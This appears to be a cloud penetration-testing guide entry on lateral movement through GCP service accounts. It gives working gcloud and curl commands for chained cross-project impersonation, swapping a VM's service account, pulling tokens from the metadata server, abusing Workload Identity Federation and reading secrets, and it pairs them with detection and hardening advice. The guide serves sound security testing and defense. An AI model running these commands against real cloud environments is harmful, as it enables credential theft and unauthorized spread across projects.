---
cstg_id: CSTG-GCP-SERVICE-ACCOUNTS-LATERAL
title: "GCP Service Accounts - Lateral Movement"
provider: gcp
service: service-accounts
phase: lateral-movement
required_access: assumed-breach
required_permissions:
  - iam.serviceAccounts.getAccessToken
  - iam.serviceAccounts.actAs
  - iam.serviceAccounts.implicitDelegation
  - iam.workloadIdentityPools.providers.create
  - compute.instances.setServiceAccount
  - compute.instances.create
  - container.clusters.get
  - cloudfunctions.functions.create
tools:
  - gcloud CLI
  - Google Cloud IAM Credentials API
  - kubectl
  - metadata server queries
references:
  - "https://cloud.google.com/iam/docs/create-short-lived-credentials-direct"
  - "https://cloud.google.com/iam/docs/workload-identity-federation"
  - "https://cloud.google.com/kubernetes-engine/docs/concepts/workload-identity"
  - "https://cloud.google.com/iam/docs/impersonating-service-accounts"
  - "https://hackingthe.cloud/gcp/exploitation/gcp-priv-esc/"
  - "https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/"
license: CC BY-SA 4.0
---

## Summary

Where privilege escalation moves *up* (gaining more rights within a scope), lateral movement moves *across* — between workloads, projects, and even organizations — using service accounts as the connective tissue. A single compromised service account frequently holds roles in multiple projects, can impersonate service accounts elsewhere, or is the trust anchor for Workload Identity bindings that reach into Kubernetes pods and external CI/CD systems. The objective of this phase is to use a controlled service account identity to pivot to other identities and other resource scopes, expanding the breach footprint without necessarily increasing the privilege level.

The dominant GCP lateral-movement mechanics are: (1) chained impersonation across SAs, including cross-project and through delegation; (2) attaching/replacing the service account on a workload to inherit its identity; (3) Workload Identity Federation and GKE Workload Identity, which bridge external/Kubernetes identities to GCP SAs and vice versa; and (4) harvesting credentials from workloads the SA can reach (metadata server, secrets, attached keys).

## Prerequisites

Assumed-breach with control of a service account (via a stolen key, a minted token, or code execution on a workload running as the SA). From [Enumeration](../02-services/gcp-service-accounts-enum.md) the tester knows: which projects the SA holds roles in, which other SAs it can impersonate, and which workloads/federation pools reference it. Useful permissions for the techniques below include impersonation rights on remote SAs (`getAccessToken`, `actAs`, `implicitDelegation`), workload-attach rights (`compute.instances.setServiceAccount`, `compute.instances.create`), and Workload Identity configuration rights (`iam.workloadIdentityPools.providers.create`).

## Enumeration

```bash
# Which projects can the current identity touch?
gcloud projects list
for P in $(gcloud projects list --format="value(projectId)"); do
  echo "== $P =="
  gcloud projects get-iam-policy "$P" --format=json 2>/dev/null \
    | jq -r '.bindings[] | select(.members[] | contains("CURRENT_SA")) | .role'
done

# Which other SAs can the current identity impersonate (cross-project)?
gcloud asset analyze-iam-policy --organization=ORG_ID \
  --identity="serviceAccount:CURRENT_SA" \
  --format=json | jq '.. | .resource? // empty' | grep serviceAccounts

# GKE Workload Identity bindings (which K8s SA maps to which GCP SA)
gcloud iam service-accounts get-iam-policy TARGET_SA --format=json \
  | jq '.bindings[] | select(.role=="roles/iam.workloadIdentityUser")'

# Workload Identity Federation pools/providers (external IdP trust)
gcloud iam workload-identity-pools list --location=global
gcloud iam workload-identity-pools providers list \
  --workload-identity-pool=POOL --location=global
```

## Misconfigurations & Findings

- A service account granted roles across **multiple projects or at the folder/org level**, turning one compromise into multi-project access.
- **Impersonation chains** — SA A can impersonate SA B (different project) which can impersonate SA C, crossing trust boundaries.
- **GKE Workload Identity** mappings where a low-trust namespace/KSA is bound to a high-privilege GCP SA via `workloadIdentityUser`.
- **Workload Identity Federation** providers with permissive attribute mappings/conditions (e.g. accepting any repository or any branch from a CI provider), letting an external attacker impersonate a GCP SA.
- Workloads where the running SA can be **swapped** (`setServiceAccount`) to a more useful identity.
- Shared/long-lived SA keys reused across environments, so a key found in one project unlocks resources in another.

## Exploitation

### Chained and cross-project impersonation

If the controlled identity can impersonate an SA in another project, pivot directly:

```bash
# Hop into project B by impersonating an SA that holds roles there
gcloud compute instances list --project=PROJECT_B \
  --impersonate-service-account=workload@PROJECT_B.iam.gserviceaccount.com

# Multi-hop via delegation when no direct edge exists
gcloud auth print-access-token \
  --impersonate-service-account=final@PROJECT_C.iam.gserviceaccount.com \
  --delegates=bridge@PROJECT_B.iam.gserviceaccount.com
```

Each hop inherits the target SA's roles in its own project, achieving lateral reach across the org.

### Attach or replace a workload's service account

If the controlled identity can create or modify a workload (and has `actAs` on the desired SA), launch/modify a resource to run as a more useful identity, then harvest its token from the metadata server.

```bash
# Replace the SA on a stopped instance, then start it and pull the token
gcloud compute instances set-service-account INSTANCE --zone ZONE \
  --service-account=target@PROJECT.iam.gserviceaccount.com \
  --scopes=cloud-platform
gcloud compute instances start INSTANCE --zone ZONE

# On the instance:
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

### GKE Workload Identity pivot

Inside a GKE cluster with Workload Identity enabled, a pod's Kubernetes service account maps to a GCP SA. If a tester controls a workload in a namespace bound to a privileged GCP SA, the pod transparently obtains that SA's tokens via the GKE metadata server:

```bash
# From inside a pod
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

Pivot can also run the other direction: from GCP into the cluster, by impersonating the node/Workload Identity SA that holds `container.*` roles and then using `kubectl` with `gcloud container clusters get-credentials`.

### Workload Identity Federation abuse

If an external identity provider (CI/CD, another cloud, OIDC) is federated to a GCP SA with loose conditions, an attacker who controls a matching external subject can mint GCP credentials without any GCP key:

```bash
# Exchange an external OIDC token for a GCP SA access token
gcloud iam workload-identity-pools create-cred-config \
  projects/PROJECTNUM/locations/global/workloadIdentityPools/POOL/providers/PROVIDER \
  --service-account=federated@PROJECT.iam.gserviceaccount.com \
  --output-file=/tmp/cred.json --credential-source-file=/path/to/oidc-token
gcloud auth login --cred-file=/tmp/cred.json
```

A tester who can *create* a pool/provider (`iam.workloadIdentityPools.providers.create`) can also establish a new trust to an attacker-controlled IdP and bind it to a privileged SA — a lateral-movement and persistence bridge.

### Credential harvesting from reachable workloads

Use the SA's existing access to read secrets that unlock other identities and systems:

```bash
gcloud secrets list
gcloud secrets versions access latest --secret=db-prod-password
gcloud compute instances describe INSTANCE --zone ZONE \
  --format="value(metadata.items)"   # startup scripts often embed creds
```

## Detection & Logging

- **Cloud Audit Logs — Data Access** for `iamcredentials.googleapis.com` capture cross-project and chained `GenerateAccessToken` calls, including the `delegates` chain — the clearest signal of impersonation-based lateral movement (must be enabled).
- **Admin Activity logs** record `compute.instances.setServiceAccount`, `compute.instances.insert`, `SetIamPolicy` adding `workloadIdentityUser`, and `CreateWorkloadIdentityPoolProvider`. Alert on new federation providers and SA swaps.
- Token usage from an unexpected source region/IP, or a workload SA suddenly acting in a project it never used before, indicates a pivot.
- GKE/Workload Identity token requests appear at the GKE metadata server; correlate pod identity with GCP SA usage. Secret accesses appear in Secret Manager Data Access logs.
- Security Command Center / Event Threat Detection flags anomalous cross-project service-account activity and IAM grants of impersonation roles.

## Remediation & Hardening

- Scope service-account roles to a single project where possible; avoid folder/org-level grants to workload SAs to contain blast radius.
- Restrict impersonation (`serviceAccountTokenCreator`, `actAs`) to the minimum principals and individual SAs; use IAM Conditions to bound by resource and context.
- Lock down Workload Identity Federation: use specific, restrictive attribute conditions (exact repository, branch, audience) so only intended external subjects can impersonate an SA; review all pools/providers.
- For GKE, bind Kubernetes service accounts only to least-privilege GCP SAs; enable Workload Identity and disable the legacy node metadata endpoint and broad node-SA scopes.
- Enforce metadata concealment / `--metadata=disable-legacy-endpoints=true` and restrict who can call `compute.instances.setServiceAccount`.
- Store secrets in Secret Manager with tight IAM, rotate them, and avoid embedding credentials in instance metadata/startup scripts.

## Tools

- **gcloud CLI** — `--impersonate-service-account`, `--delegates`, `compute instances set-service-account`, `workload-identity-pools`.
- **Google Cloud IAM Credentials API** — chained token generation across projects.
- **kubectl** with `gcloud container clusters get-credentials** — pivot between GCP and GKE.
- **Metadata server queries** — harvest tokens from compromised VMs/pods.

## References

- Direct short-lived credentials / impersonation — https://cloud.google.com/iam/docs/create-short-lived-credentials-direct
- Impersonating service accounts — https://cloud.google.com/iam/docs/impersonating-service-accounts
- Workload Identity Federation — https://cloud.google.com/iam/docs/workload-identity-federation
- GKE Workload Identity — https://cloud.google.com/kubernetes-engine/docs/concepts/workload-identity
- GCP privilege escalation / lateral techniques (Rhino Security Labs) — https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/
- GCP exploitation (hackingthe.cloud) — https://hackingthe.cloud/gcp/exploitation/gcp-priv-esc/
